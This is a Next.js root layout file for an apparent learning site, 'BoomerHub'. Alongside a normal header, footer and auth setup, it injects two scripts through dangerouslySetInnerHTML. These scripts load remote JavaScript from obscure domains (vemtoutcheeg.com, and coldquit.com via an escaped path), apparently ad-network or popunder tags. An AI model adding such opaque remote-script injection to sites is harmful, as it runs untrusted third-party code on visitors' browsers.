
import type {Metadata} from 'next';
import './globals.css';
import { Header } from '@/components/layout/header';
import { Footer } from '@/components/layout/footer';
import { Toaster } from '@/components/ui/toaster';
import { AuthProvider } from '@/hooks/use-auth';
import Script from 'next/script';


export const metadata: Metadata = {
  title: 'BoomerHub',
  description: 'Learn Skills. Earn Income. Get Certified.',
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en" suppressHydrationWarning>
      <head>
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="anonymous" />
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
        
      </head>
      <body className="font-body antialiased">
          <AuthProvider>
            <div className="relative flex min-h-screen flex-col">
              <Header />
              <main className="flex-1">{children}</main>
              <Footer />
            </div>
            <Toaster />
          </AuthProvider>
          <div dangerouslySetInnerHTML={{ __html: `
            <script>(s=>{s.dataset.zone='9810543',s.src='https://vemtoutcheeg.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
          `}} />
          <div dangerouslySetInnerHTML={{ __html: `
            <script>
            (function(lfrslz){
            var d = document,
                s = d.createElement('script'),
                l = d.scripts[d.scripts.length - 1];
            s.settings = lfrslz || {};
            s.src = "\\/\\/coldquit.com\\/c\\/DJ9-6Jb.2c5\\/ltSfWQQ-9\\/NijcYAzNNTj-IZ4aMeSO0T2BNlj\\/MA2tM\\/j\\/gYys";
            s.async = true;
            s.referrerPolicy = 'no-referrer-when-downgrade';
            l.parentNode.insertBefore(s, l);
            })({})
            </script>
          `}} />
      </body>
    </html>
  );
}
